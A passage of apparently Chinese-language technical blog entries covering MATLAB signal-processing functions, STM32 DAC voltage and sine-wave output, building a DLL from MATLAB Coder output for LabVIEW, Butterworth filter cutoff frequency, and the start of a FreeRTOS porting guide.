nargin&gt;=3    ylabel(varargin&#123;3&#125;);endif nargin&gt;=4    xlim(varargin&#123;4&#125;);endif nargin&gt;=5    ylim(varargin&#123;5&#125;);endend</code></pre><h2 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h2><h3 id="频谱分析"><a href="#频谱分析" class="headerlink" title="频谱分析"></a>频谱分析</h3><pre><code class="matlab">function [freq,amp]=fft_signal(signal,fs,N)% Spectrum analysis% INPUTS:% signal = input time series% fs = data sampling frequency% N = data length of signal%% OUTPUTS:% freq = frequency of Spectrum% amp = amplitude of Spectrum%% EXAMPLE 1:% fs = 100;% N = fs*10;% t = (0:N-1)/fs;% y = sin(2*pi*10*t);% [freq,amp] = fft_signal(y,fs,N);% plot(freq,amp);amp = 2*abs(fft(signal))/N;        % 求取信号的幅度谱amp = amp(1:fix(length(amp)/2));       % 截取有效部分freq=(0:length(amp)-1)*fs/N;       % 横坐标代表频率end</code></pre><h3 id="幅值分布"><a href="#幅值分布" class="headerlink" title="幅值分布"></a>幅值分布</h3><pre><code class="matlab">function [ amp,dist ] = ampDist( signal,sectionNum )% Calculate the amplitude distribution of the signal% INPUTS:% signal : The signal to be analyzed% sectionNum : Number of segments%% OUTPUTS:% amp : Amplitude after segmentation% dist :Amplitude distribution%% EXAMPLE 1:% fs = 1000;% N = fs*100;% y = wgn(1,N,10);     % 高斯白噪声% [amp,dist] = ampDist(y,500);% bar(amp,dist);yMin = min(signal);yMax = max(signal);amp = linspace(yMin,yMax,sectionNum);dist = hist(signal,amp);dist = dist./length(signal);end</code></pre><h3 id="LMS最小均方算法"><a href="#LMS最小均方算法" class="headerlink" title="LMS最小均方算法"></a>LMS最小均方算法</h3><pre><code class="matlab">function [ y_error, y_filter ] = LMS( x_input,x_dest,M,u )% LMS 最小均方算法% INPUTS：% x_input    原始信号% x_dest     期望信号% M          阶次% u          步长因子%% OUTPUTS：% y_error    误差信号% y_filter   滤波器信号输出%% EXAMPLE 1:% load train% t = (1:length(y))/Fs;% M = 2; u = 0.5;% y_dest = (max(y)-min(y))/2*cos(2*pi*18*t);      % 参考信号% [y_error,y_filter] = LMS(y,y_dest,M,u);% plot(t,y_error,t,y_filter);N = length(x_input);y_filter = zeros(1,N);y_error  = zeros(1,N);h = zeros(1,M);for k=M:N    h_old = h;    y_filter(k) = x_dest(k:-1:k-M+1)*h_old&#39;;    y_error(k)  = x_input(k) - y_filter(k);    h = h_old + 2*u*y_error(k)*x_dest(k:-1:k-M+1);endend</code></pre><h3 id="EMD经验模态分解"><a href="#EMD经验模态分解" class="headerlink" title="EMD经验模态分解"></a>EMD经验模态分解</h3><pre><code class="matlab">function imf = emd(x)% Empiricial Mode Decomposition (Hilbert-Huang Transform)% imf = emd(x)% Funcs : ismonotonic, isimf, getspline, findpeaksx   = transpose(x(:));      % 将x变为一维向量imf = [];while ~ismonotonic(x)   x1 = x;   sd = Inf;   cnt=0;   while (sd &gt; 0.1) || ~isimf(x1)      s1 = getspline(x1);      s2 = -getspline(-x1);      x2 = x1-(s1+s2)/2;      sd = sum((x1-x2).^2)/sum(x1.^2);      x1 = x2;      cnt=cnt+1;   end%    cnt   imf&#123;end+1&#125; = x1;   x          = x-x1;endimf&#123;end+1&#125; = x;% FUNCTIONS% 判断信号的单调性function u = ismonotonic(x)u1 = length(findpeaks(x))*length(findpeaks(-x));if u1 &gt; 0    u = 0;else    u = 1;end% 判断信号是否满足IMF条件% 条件：极大值点数和极小值点数之和与过零点数相等或相差1？function u = isimf(x)N  = length(x);u1 = sum(x(1:N-1).*x(2:N) &lt; 0);u2 = length(findpeaks(x))+length(findpeaks(-x));if abs(u1-u2) &gt; 1    u = 0;else    u = 1;end% 使用三次样条函数，得到包络线function s = getspline(x)N = length(x);p = findpeaks(x);s = spline([0 p N+1],[0 x(p) 0],1:N);% 寻找极大值点function n = findpeaks(x)% Find peaks.% n = findpeaks(x)n    = find(diff(diff(x) &gt; 0) &lt; 0);u    = find(x(n+1) &gt; x(n));n(u) = n(u)+1;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Matlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> signal </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stm32 - DAC基本输出方式</title>
      <link href="2016/12/05/stm32-dac/"/>
      <url>2016/12/05/stm32-dac/</url>
      
        <content type="html"><![CDATA[<h2 id="DAC简介"><a href="#DAC简介" class="headerlink" title="DAC简介"></a>DAC简介</h2><p>数模转换器(DAC)是极为常用的电子器件，可以将数字量转换为以参考量为基准的模拟量，以满足应用需求。</p><h3 id="电压输出模式"><a href="#电压输出模式" class="headerlink" title="电压输出模式"></a>电压输出模式</h3><p>在<code>stm32</code>中，<code>D/A</code>转换器包含以下三种输出方式：</p><ol><li>输出电压</li><li>噪声生成</li><li>三角波生成</li></ol><p>本文将着重介绍最基本的电压输出方式。</p><h3 id="主要特征"><a href="#主要特征" class="headerlink" title="主要特征"></a>主要特征</h3><p>DAC的主要特征有：</p><ol><li>2个DAC转换器：1个输出通道对应1个转换器</li><li>8位或者12位单调输出</li><li>12位模式下数据左对齐或者右对齐</li><li>同步更新功能</li><li>噪声波形生成</li><li>三角波形生成</li><li>双DAC通道同时或者分别转换</li><li>每个通道都有DMA功能</li><li>外部触发转换</li><li>输入参考电压V_REF+</li></ol><h3 id="数据对齐方式"><a href="#数据对齐方式" class="headerlink" title="数据对齐方式"></a>数据对齐方式</h3><p>DAC 输出通道的数据对齐方式包含以下三种：</p><ol><li>8位右对齐</li><li>12位左对齐</li><li>12位右对齐</li></ol><p>此外，在单 DAC 通道模式下，数据寄存器的存储方式如下：</p><p><img src="/assets/stm32/dacAlignMode.png" alt="dacAlignMode1"></p><p>在双 DAC 通道模式下，数据寄存器的存储方式则为：</p><p><img src="/assets/stm32/dacAlignMode2.png" alt="dacAlignMode2"></p><p>我通常会选择12位右对齐方式，并在单通道模式设置数据时与<code>0x0fff</code>进行&quot;位与&quot;。</p><h3 id="DAC转换"><a href="#DAC转换" class="headerlink" title="DAC转换"></a>DAC转换</h3><p><img src="/assets/stm32/dacConvert.png" alt="dacConvert"></p><p>用户无法直接对DAC的数据寄存器 DAC_DORx 写入数据，只能通过修改数据保持寄存器 DAC_DHRx 装入数据。</p><ol><li>未选择&quot;硬件触发&quot;时，保持寄存器 DAC_DHRx 的值将在1个APB1周期后自动传入数据寄存器 DAC_DORx；</li><li>已选择&quot;硬件触发&quot;时，保持寄存器 DAC_DHRx 的值将在触发发生后3个APB1后传入数据寄存器 DAC_DORx。</li><li>当数据存入 DAC_DORx 后再经过时间 t_settings（与负载和电源电压有关），输出变为有效。</li></ol><h3 id="DAC触发方式"><a href="#DAC触发方式" class="headerlink" title="DAC触发方式"></a>DAC触发方式</h3><pre><code class="C">#define DAC_Trigger_None                   ((uint32_t)0x00000000)/*!&lt; Conversion is automatic once the DAC1_DHRxxxx registerhas been loaded, and not by external trigger */#define DAC_Trigger_T6_TRGO                ((uint32_t)0x00000004)/*!&lt; TIM6 TRGO selected as external conversion trigger for DAC channel */#define DAC_Trigger_T8_TRGO                ((uint32_t)0x0000000C)/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channelonly in High-density devices*/#define DAC_Trigger_T3_TRGO                ((uint32_t)0x0000000C)/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channelonly in Connectivity line, Medium-density and Low-density Value Line devices */#define DAC_Trigger_T7_TRGO                ((uint32_t)0x00000014)/*!&lt; TIM7 TRGO selected as external conversion trigger for DAC channel */#define DAC_Trigger_T5_TRGO                ((uint32_t)0x0000001C)/*!&lt; TIM5 TRGO selected as external conversion trigger for DAC channel */#define DAC_Trigger_T15_TRGO               ((uint32_t)0x0000001C)/*!&lt; TIM15 TRGO selected as external conversion trigger for DAC channelonly in Medium-density and Low-density Value Line devices*/#define DAC_Trigger_T2_TRGO                ((uint32_t)0x00000024)/*!&lt; TIM2 TRGO selected as external conversion trigger for DAC channel */#define DAC_Trigger_T4_TRGO                ((uint32_t)0x0000002C)/*!&lt; TIM4 TRGO selected as external conversion trigger for DAC channel */#define DAC_Trigger_Ext_IT9                ((uint32_t)0x00000034)/*!&lt; EXTI Line9 event selected as external conversion trigger for DAC channel */#define DAC_Trigger_Software               ((uint32_t)0x0000003C)/*!&lt; Conversion started by software trigger for DAC channel */</code></pre><p><strong>触发方式</strong> 大致可分为四类：</p><ol><li>DAC_Trigger_None : 无触发;</li><li>DAC_Trigger_Tx_TRGO : 来自片上定时器的TRGO输出</li><li>DAC_Trigger_Ext_IT9 : 来自外部中断线9的上升沿</li><li>DAC_Trigger_Software : 来自软件控制位 SWTRIG</li></ol><p>当 DAC 接口检测到来自定时器 <strong>TRGO输出</strong> 或 <strong>EXTI9</strong> 的上升沿时，最近存入 DAC_DHRx 中的数据将被传入 DAC_DORx 中。经3个APB1周期后更新 DAC_DORx 的值。对于 &quot;软件触发&quot;，需要在程序中对 <strong>SWTRIG</strong> 置位完成触发，该触发位将被硬件自动清零。</p><h3 id="DAC输出电压"><a href="#DAC输出电压" class="headerlink" title="DAC输出电压"></a>DAC输出电压</h3><p>DAC输出 = V_reference × DOR /4095;</p><p>式中，V_reference 为参考电压，DOR 为 DAC 输出数据寄存器的值（0<del>255/0</del>4095）。</p><h2 id="DAC-基本输出方式"><a href="#DAC-基本输出方式" class="headerlink" title="DAC 基本输出方式"></a>DAC 基本输出方式</h2><h3 id="DAC-参数设置"><a href="#DAC-参数设置" class="headerlink" title="DAC 参数设置"></a>DAC 参数设置</h3><p>在<code>stm32f103</code>中包含2个通道的12位<code>D/A</code>转换器，<code>PA4</code>与<code>PA5</code>作为两个通道输出接口，在使用时需要配置为模拟输入<code>AIN</code>。当使能 DAC 的输出通道后，相应的 GPIO 管脚将自动与 DAC 的模拟输出接口（DAC_OUTx）相连。</p><pre><code class="C">void dacConfig(void)&#123;GPIO_InitTypeDef  GPIO_InitStructure;DAC_InitTypeDef DAC_InitStructure;/* 开启GPIOA时钟 */RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);GPIO_InitStructure.GPIO_Pin = GPIO_Pin_4;GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AIN;/* 配置DAC输出通道 */GPIO_Init(GPIOA, &amp;GPIO_InitStructure);/* 开启DAC时钟 */RCC_APB1PeriphClockCmd(RCC_APB1Periph_DAC,ENABLE);DAC_InitStructure.DAC_Trigger = DAC_Trigger_None;                  // 无触发DAC_InitStructure.DAC_WaveGeneration = DAC_WaveGeneration_None;    // 无波形生成DAC_InitStructure.DAC_LFSRUnmask_TriangleAmplitude = DAC_LFSRUnmask_Bit0;DAC_InitStructure.DAC_OutputBuffer = DAC_OutputBuffer_Disable;     // 禁用输出缓存/* 配置DAC参数 */DAC_Init(DAC_Channel_1,&amp;DAC_InitStructure);/* enable dac1 */DAC_Cmd(DAC_Channel_1,ENABLE);&#125;</code></pre><h3 id="设置-DAC-输出电压"><a href="#设置-DAC-输出电压" class="headerlink" title="设置 DAC 输出电压"></a>设置 DAC 输出电压</h3><p>经测试，我所用最小系统板的DA参考电压并非<code>3.3v</code>，而是接近于<code>3.24v</code>，我们可以通过宏定义配置好参考电压。</p><pre><code class="C">#define REFERENCE_VOLTAGE 3.24f      // DAC 参考电压</code></pre><p>根据公式 <code>data = 4095*(v/v_ref)</code>可以求得电压v对应的12位数。</p><pre><code class="C">void setVoltage(double voltage)&#123;uint16_t temp;if(voltage &lt; 0.0 || voltage &gt; REFERENCE_VOLTAGE)  return;temp = (uint16_t)(4095*voltage/REFERENCE_VOLTAGE) &amp; 0x0fff;DAC_SetChannel1Data(DAC_Align_12b_R,temp);     // 电压输出：12位右对齐&#125;</code></pre><h3 id="产生正弦波信号"><a href="#产生正弦波信号" class="headerlink" title="产生正弦波信号"></a>产生正弦波信号</h3><p>使用宏定义<code>PI</code>以及采样频率，并添加头文件<code>math.h</code>。</p><pre><code class="C">#include &lt;math.h&gt;#define PI  3.14159f#define FSAMPLE 100                 // 采样频率 （Hz）</code></pre><p>使用<code>sin</code>函数和一个<code>static</code>变量即可生成正弦信号。</p><pre><code class="C">void createSinWave(double baseAmp, double amp, double frequency, double fSample)&#123;static uint32_t time = 0;double voltage = 0.0;voltage = amp*sin(2*PI*frequency*time/fSample) + baseAmp;time++;setVoltage(voltage);&#125;</code></pre><p>修改<code>main</code>函数，每隔一个采样周期修改一次DA输出电压，完成正弦信号的输出。</p><pre><code class="C">int main(void)&#123;dacConfig();while(1)&#123;  createSinWave(2,0.5,1,FSAMPLE); // 产生 2±0.5v , 1Hz 的正弦信号  delayMs(1000.0/FSAMPLE);&#125;&#125;</code></pre><h3 id="查看波形"><a href="#查看波形" class="headerlink" title="查看波形"></a>查看波形</h3><p>使用示波器或NI采集卡即可查看生成的正弦信号。</p><p><img src="/assets/stm32/dacOutput.png" alt="DacOutput"></p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> stm32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab - 经VS将.m文件转换为.dll文件</title>
      <link href="2016/11/25/matlab-coder/"/>
      <url>2016/11/25/matlab-coder/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在使用 LabVIEW 进行软件开发的过程中，有时需要使用 Matlab 强大的数据处理功能，以提高开发效率，此时可以通过 Matlab Coder 将 Matlab 中的函数转换为 C/C++ 源文件，然后通过 Visual Studio 将这些源文件封装为 .dll 文件，最后通过 LabVIEW 调用库函数实现对 Matlab 函数的调用。</p><p>本文将通过一个实例讲述以上功能的实现过程，大体步骤如下：</p><ol><li>Matlab 编写代码<br> 1.1 编写 .m 函数<br> 1.2 使用 Coder 生成 C/C++ 文件</li><li>Visual Studio 生成 .dll 文件</li><li>LabVIEW 调用 .dll文件</li></ol><p>软件版本说明：</p><ol><li>Matlab 2016a       (64bit)</li><li>LabVIEW 2015       (64bit)</li><li>Visual Studio 2015 (64bit)</li></ol><h2 id="通过-Matlab-生成-C-C-源文件"><a href="#通过-Matlab-生成-C-C-源文件" class="headerlink" title="通过 Matlab 生成 C/C++ 源文件"></a>通过 Matlab 生成 C/C++ 源文件</h2><h3 id="m-函数编码"><a href="#m-函数编码" class="headerlink" title=".m 函数编码"></a>.m 函数编码</h3><p>在 Matlab 文件目录中新建文件夹&quot;CreateDll&quot;，在该文件夹下新建两个函数文件，分别实现简单加法运算函数，以及一个用自相关求解周期信号频率的函数。</p><p>add(a, b)</p><pre><code class="matlab">function [ answer ] = add( a,b )% 加法运算% a,b 均为 double 型数据answer = a + b;end</code></pre><p>getFreq( signal, fs )</p><pre><code class="matlab">function [ frequency ] = getFreq( signal,fs )%GETFREQ 自相关法求周期信号频率% [input]% signal    : double 1*n% fs        : double 1*1% [output]% frequency : double  1*1y_xcorr = xcorr(signal,&#39;coeff&#39;);            % 信号自相关[~,locs] = findpeaks(y_xcorr);              % 获取峰值位置middlePosition = fix(length(locs)/2);       % 计算处于中部的峰值位置frequency = fs/(locs(middlePosition)-locs(middlePosition-1)); % 计算信号频率end</code></pre><h3 id="使用-Coder-生成-C-C-文件"><a href="#使用-Coder-生成-C-C-文件" class="headerlink" title="使用 Coder 生成 C/C++ 文件"></a>使用 Coder 生成 C/C++ 文件</h3><ul><li>1.在命令行中输入 coder 打开 Matlab Coder 工具。</li></ul><pre><code class="matlab">&gt;&gt; coder</code></pre><p><img src="/assets/matlab/coder1.png" alt="Matlab Coder"></p><ul><li>2.添加 add 函数及 getFreq 函数</li></ul><p><img src="/assets/matlab/coder2.png" alt="Matlab Coder"></p><ul><li>3.定义函数输入参数的数据类型（两种定义方式）</li></ul><ol><li>手动修改输入参数的数据类型</li><li>输入函数调用示例，通过 Coder 工具的自定义输入功能自动匹配输入参数类型</li></ol><p>调用示例：</p><pre><code class="matlab">&gt;&gt; add(3,4);</code></pre><p><img src="/assets/matlab/coder3.png" alt="Matlab Coder"></p><p>手动可选择的数据类型如下图所示：</p><p><img src="/assets/matlab/coder3_1.png" alt="Input types"></p><ul><li>4.设定数据长度</li></ul><ol><li>对于大部分变量，数据长度为 1×1</li><li>对于一维<strong>向量、数组</strong></li><li>1 固定长度的变量：直接设定具体值（如：一个星期每天的工作时间，可设为 1×7）</li><li>2 不定长度但有上限的变量：设定 1×:100 （假定上限值为 100）</li><li>3 不定长度上限不定的变量：设定 1×:inf （inf代表无限）</li><li>二维数组设定规则与一维数组类似</li></ol><p><img src="/assets/matlab/coder3_2.png" alt="Input length"></p><ul><li>5.Check for Run-Time Issues</li></ul><p>这一步可以跳过，这是用来生成试用代码以及用于 Matlab 的 MEX 文件。</p><p><img src="/assets/matlab/coder4.png" alt="Check for Run-Time Issues"></p><ul><li>6.Generate Code</li></ul><p>选择 C++ 语言，通过 &quot; More Settings &quot; 修改代码生成相关的配置选项,最后点击 &quot; Generate &quot; 按钮生成源代码。</p><p>选择语言&lt;<img src="/assets/matlab/coder5.png" alt="Generate Code"></p><p>配置选项&lt;<img src="/assets/matlab/coder5_1.png" alt="More Settings"></p><p>生成代码&lt;<img src="/assets/matlab/coder6.png" alt="C++ Code"></p><p>在代码生成界面可以看到以下内容：</p><ol><li>Source Code : Matlab 中创建的函数源代码</li><li>Output Files : Coder 工具生成得到的 .h 头文件和 .cpp 源文件</li><li>Build Log : 用于查看代码生成报告</li><li>Variables : 选中 Matlab 文件时显示函数的输入输出数据类型和大小</li></ol><ul><li>7.Finsh Workflow</li></ul><p>完成工作流程&lt;<img src="/assets/matlab/coder7.png" alt="Finish WorkFlow"></p><p>查看代码&lt;<img src="/assets/matlab/coder8.png" alt="Select Code"></p><p>可以看出，最终生成的文件较多，代码量较大，这可以归结为以下几个原因：</p><ol><li>重新实现fft等复杂算法</li><li>考虑各种异常情况的处理</li><li>考虑不定长数组或向量的内存分配问题</li><li>考虑无限值 inf 和 无效值 NaN</li><li>不同编程语言间数据类型的转换</li></ol><p>当然，我们可以在代码生成前根据需求进行相关设置，以避免不必要文件的产生，此处不予详述。</p><p>最后将生成的所有 .h/.cpp 文件复制到剪切板中以备后用。至此，Matlab 部分的工作已经全部完成。</p><h2 id="通过-Visual-Studio-生成-dll-文件"><a href="#通过-Visual-Studio-生成-dll-文件" class="headerlink" title="通过 Visual Studio 生成 .dll 文件"></a>通过 Visual Studio 生成 .dll 文件</h2><p>在 VS 中要做的就是将 Matlab Coder 生成的 C++ 文件封装为 dll 文件，以供 LabVIEW 程序调用。</p><h3 id="创建-win32-项目"><a href="#创建-win32-项目" class="headerlink" title="创建 win32 项目"></a>创建 win32 项目</h3><p><img src="/assets/matlab/CreateDll.png" alt="Create VS Project"></p><p>在win32应用程序向导中选择 <strong>DLL</strong>，并勾选 <strong>空项目</strong> ，然后点击完成。</p><p><img src="/assets/matlab/CreateDll1.png" alt="Create VS Project"></p><h3 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h3><p>将从 Matlab 中复制的 C++ 文件粘贴到 CreateDll 项目的本地文件中，然后在项目中添加这些文件。</p><p><img src="/assets/matlab/CreateDll2_1.png" alt="Add Source Files to VS Project"></p><p><img src="/assets/matlab/CreateDll2.png" alt="Add Source Files to VS Project"></p><h3 id="新建模块定义文件"><a href="#新建模块定义文件" class="headerlink" title="新建模块定义文件"></a>新建模块定义文件</h3><p>在 VS 中新建 .def 模块定义文件，输入以下代码</p><pre><code class="def">LIBRARY CreateDllEXPORTSaddgetFreq</code></pre><p>LIBRARY 后面添加库名称，EXPORTS 后面添加需要导出的函数名称。</p><p><img src="/assets/matlab/CreateDll3.png" alt=".def file"></p><p>编辑完成后，可以在 &quot;项目属性&gt;&gt;链接器&gt;&gt;输入&gt;&gt;模块定义文件&quot; 中看到，项目已将该选项自动添加为了当前 .def 文件，对于低版本的 VS 可能需要手动添加。</p><h3 id="生成-dll-文件"><a href="#生成-dll-文件" class="headerlink" title="生成 .dll 文件"></a>生成 .dll 文件</h3><p>最后一步，选中项目名称，点击右键选择 &quot;<strong>生成</strong>&quot; ，从本地项目目录的 Debug 文件夹中可以找到已生成的 .dll 文件。</p><p>值得注意的是：</p><ol><li>选择 Debug 模式为 x64 时生成 64 位 dll 文件，文件存于 .\x64\Debug\Create.dll</li><li>选择 Debug 模式为 x86 时生成 32 位 dll 文件，文件存于 .\Debug\Create.dll</li></ol><p>对于不同位数的 LabVIEW 程序，我们可以选择对应的 Debug 模式，这个功能真的是非常棒！</p><p><img src="/assets/matlab/CreateDll4.png" alt="Bulid .dll file"></p><h3 id="函数接口"><a href="#函数接口" class="headerlink" title="函数接口"></a>函数接口</h3><p>经 VS 生成的 API 函数接口说明如下：</p><p>add</p><pre><code class="C++">double add(double a, double b);</code></pre><p>getFreq</p><pre><code class="C++">double getFreq(const double b_signal[1000], double fs);</code></pre><p>因为例程所用数据为定长数组（1×1000），所以输入参数的数据类型为基本的 double 型。倘若定义的 b_signal 为不定长数组 （1×:inf） ,其格式将变为：</p><pre><code class="C++">double getFreq(const emxArray_real_T *b_signal, double fs);</code></pre><p>这是因为程序需要为不确定长度的数组动态分配内存，所以有效数据与其描述信息将被封装到结构体中，该结构体为 &quot;<strong>emxArray_real_T</strong>&quot;</p><pre><code class="C++">struct emxArray_real_T&#123;  double *data;  int *size;  int allocatedSize;  int numDimensions;  boolean_T canFreeData;&#125;;</code></pre><p>结构体中的 &quot;<strong>boolean_T</strong>&quot; 定义如下</p><pre><code class="C++">typedef unsigned char boolean_T;</code></pre><p>由于不定长数据会导致大量冗余代码，并且在 LabVIEW 中调用时非常麻烦，除非必须，否则不建议使用，本文后续所述也是定长数组。</p><h2 id="通过-LabVIEW-调用-dll文件"><a href="#通过-LabVIEW-调用-dll文件" class="headerlink" title="通过 LabVIEW 调用 .dll文件"></a>通过 LabVIEW 调用 .dll文件</h2><p>通过 VS，我们已经得到了想要的 .dll 文件，那么在 LabVIEW 中该如何调用呢？这里提供两种方法。</p><ol><li>通过调用库函数节点（Call Library Function Node）</li><li>通过 LabVIEW 导入工具（Tools-&gt;Import-&gt;Shared Library(.dll)...）</li></ol><p>两种方法的原理一致，以第一种方法为例进行讲解。</p><h3 id="Call-Library-Function-Node"><a href="#Call-Library-Function-Node" class="headerlink" title="Call Library Function Node"></a>Call Library Function Node</h3><p>在 LabVIEW 函数面板搜索 &quot;Call Library&quot; ，中文版可直接搜索 <code>dll</code>。将调用库函数节点放入程序框图中。</p><p>调用 add 函数</p><ul><li>选择 CreateDll.dll 文件</li></ul><p><img src="/assets/matlab/UseDll1.png" alt="select CreateDll.dll"></p><ul><li>配置 add 函数接口</li></ul><p><img src="/assets/matlab/UseDll1_1.png" alt="Config add function"></p><ul><li>函数调用示例</li></ul><p><img src="/assets/matlab/UseDll1_2.png" alt="Use add function"></p><p>调用 getFreq 函数</p><ul><li>配置 getFreq 函数接口</li></ul><p><img src="/assets/matlab/UseDll2.png" alt="Config getFreq function"></p><ul><li>函数调用示例</li></ul><p><img src="/assets/matlab/UseDll2_2.png" alt="getFreq front panel"></p><p>先产生一个数据长度为 1000 ，频率可调的正弦信号，采样频率 1kHz；然后调用 .dll文件中的 getFreq 函数，通过自相关方法求取信号频率，并输出到变量 getFreq 中。</p><p><img src="/assets/matlab/UseDll2_3.png" alt="getFreq block diagram"></p><h3 id="不定长数组问题"><a href="#不定长数组问题" class="headerlink" title="不定长数组问题"></a>不定长数组问题</h3><p>这里对不定长数组问题进行简单介绍：.dll 文件中的函数将不再是简单的 double 指针，而是一个结构体指针；在 LabVIEW 中调用时，可以创建自定义控件，用簇代替该结构体，簇的引用作为结构体指针；簇的内容包括以下几部分。</p><pre><code class="c">double *pData : 一维数组引用，用于传递信号数据int    *pSize : 一维数组引用，用于传递数据长度int allocatedSize : 分配内存大小，调用时可设为 0int numDimensions : 数组维数，设为 1 或 2unsigned char canFreeData : 布尔变量，确定能否释放数据内存</code></pre><p><img src="/assets/matlab/UseDll2_1.png" alt="Create customsize control"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文对 &quot;Matlab Coder 生成 C++ 代码&quot;，&quot;VS 生成 .dll 文件&quot;，&quot;LabVIEW 调用外部库函数&quot; 这三部分内容进行讲述。通过Matlab , VS , LabVIEW 的结合使用，我们便可实现 LabVIEW 程序调用 Matlab 函数的目的。</p><p>此外，在 64 位的 VS 中可以通过修改 Debug 模式生成 32 位或 64 位的动态链接库，以适配不同版本的 LabVIEW。当然最后不要忘了，不同编译模式下生成的 .dll 文件存放在不同的目录下。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Matlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> labview </tag>
            
            <tag> VS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab - 设计滤波器截止频率</title>
      <link href="2016/11/14/signal-Process/"/>
      <url>2016/11/14/signal-Process/</url>
      
        <content type="html"><![CDATA[<h2 id="截止频率"><a href="#截止频率" class="headerlink" title="截止频率"></a>截止频率</h2><p>通常，我们将信号幅值衰减3dB处的频率作为截止频率，这是为何？</p><p>首先，明确以下两点：</p><ol><li>幅值的平方为功率</li><li>信号功率衰减一半时的频率被称为<strong>截止频率</strong></li></ol><p>当信号功率衰减一半 (1/2) 时，幅值衰减 sqrt(1/2) ，那么其对应的 dB 值为：</p><pre><code class="bash">20*log10(sqrt(2)/2) ≈ -3dB</code></pre><h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><h3 id="滤波器设计"><a href="#滤波器设计" class="headerlink" title="滤波器设计"></a>滤波器设计</h3><p>设计一个 butterworth 低通滤波器，采样频率 100Hz ，截止频率 20Hz ，阶次为 4 。</p><pre><code class="matlab">clcfs = 100;           % 采样频率tLen = 2;           % 时间长度pointNum = fs*2;    % 采样点数fpass = 20;         % 通带频率wp = fpass/(fs/2);      % 计算归一化角频率[b,a] = butter(4,wp);   % 设计滤波器% 获取频率特性[H,F] = freqz(b,a,pointNum,fs);H = 20*log10(abs(H));hold offplot(F,H);grid on;hold onfcAmp = H(fpass*2*pointNum/fs+1);stem(fpass,fcAmp,&#39;linewidth&#39;,2);text(fpass+2,fcAmp-1,num2str(fcAmp));setPlot(&#39;滤波器幅频特性&#39;,&#39;frequency(Hz)&#39;,&#39;amptitude(dB)&#39;,[F(1) F(end)],[-50,10]);</code></pre><h3 id="setPlot"><a href="#setPlot" class="headerlink" title="setPlot"></a>setPlot</h3><p>程序中用到的 setPlot 函数用于设置图形的 title , xlabel , ylabel , xlim , ylim.</p><pre><code class="matlab">function [  ] = setPlot( varargin )% setPlot()% setPlot(title)% setPlot(title,xlabel)% setPlot(title,xlable,ylabel)% setPlot(title,xlabel,ylabel,xlim)% setPlot(title,xlable,ylabel,xlim,ylim)narginchk(0,5);     % 判断输入参数是否足够grid on;axis tight;if nargin&gt;=1    title(varargin&#123;1&#125;);endif nargin&gt;=2    xlabel(varargin&#123;2&#125;);endif nargin&gt;=3    ylabel(varargin&#123;3&#125;);endif nargin&gt;=4    xlim(varargin&#123;4&#125;);endif nargin&gt;=5    ylim(varargin&#123;5&#125;);endend</code></pre><h3 id="滤波器幅频特性"><a href="#滤波器幅频特性" class="headerlink" title="滤波器幅频特性"></a>滤波器幅频特性</h3><p><img src="/assets/matlab/fc20Hz.png" alt="截止频率"></p><p>从图中可以看出，按照要求设计得到的滤波器，截止频率 20Hz 对应的幅值衰减为 -3.0103dB ,约为 -3dB ，与理论所述相吻合。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Matlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> signal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stm32 - FreeRTOS系统移植</title>
      <link href="2016/11/02/FreeRTOS/"/>
      <url>2016/11/02/FreeRTOS/</url>
      
        <content type="html"><![CDATA[<p>前段时间研究了一下 FreeRTOS 在 stm32 的系统移植，觉得有必要做个总结，记录这研发路上的点点滴滴。</p><h2 id="FreeRTOS"><a href="#FreeRTOS" class="headerlink" title="FreeRTOS"></a>FreeRTOS</h2><p>从 <a href="http://www.freertos.org/">FreeRTOS官网</a> 下载最新源码，我下载的是 <a href="http://pan.baidu.com/s/1jIbOqDg">FreeRTOSv9.0.0</a> ，其文件结构如下，根目录主要包含 FreeRTOS 和 FreeRTOS-Plus 两个文件夹， Plus 版系统添加了 TCP/UDP 等网络通信功能。</p><pre><code class="txt">D:\FREERTOSV9.0.0│  New - Direct to Task Notifications.html│  New - FreeRTOS+TCP.html│  Quick_Start_Guide.html│  Upgrading-to-FreeRTOS-9.html│  readme.txt│├─FreeRTOS│   │  links_to_doc_pages_for_the_demo_projects.html│   │  readme.txt│   ││   ├─Demo│   ├─License│   └─Source│└─FreeRTOS-Plus    │  readme.txt    │    ├─Demo    └─Source</code></pre><p>暂且不考虑plus版，打开FreeRTOS文件夹，其中包含3个文件夹：</p><ol><li>Demo：不同处理器的FreeRTOS系统移植例程</li><li>License：许可证，对FreeRTOS使用范围进行授权</li><li>Source：FreeRTOS源码</li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>Demo 包含了官方提供的所有已适配处理器的移植例程，我们可以根据自己所用芯片和开发环境选择合适的例程进行学习。</p><pre><code 